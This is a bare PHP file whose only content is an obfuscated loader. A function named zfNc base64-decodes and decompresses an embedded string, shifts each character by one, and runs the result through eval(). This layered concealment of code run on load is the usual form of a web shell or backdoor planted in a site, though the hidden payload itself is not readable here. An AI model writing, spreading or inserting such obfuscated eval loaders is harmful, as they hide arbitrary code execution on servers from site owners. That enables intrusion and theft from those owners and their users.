<?php function zfNc($zhP)
{ 
$zhP=gzinflate(base64_decode($zhP));
 for($i=0;$i<strlen($zhP);$i++)
 {
$zhP[$i] = chr(ord($zhP[$i])-1);
 }
 return $zhP;
 }eval(zfNc("LY4xCsJAEEUPsKeYwkLTBOsgaK+dZSAs2VEXs5slO4GIWEbBCwQPIIgQG/FIK3oK1+jv5s3j8wF8mMA04wVC31IhU0poY9DCCIaDiDHNFVrDUwRuTKxygZmnpUWgldTrePYnYRAwCGCsZCU1dNTfIfPV1sJEKKmn+RKwItTC/oUt+w4IQ3D1/d20r8PVHS9uf3L1uTSCEyYkFbq2ed4enWqKnDAlFND7CXP/91MXPLMYsd0H"));?>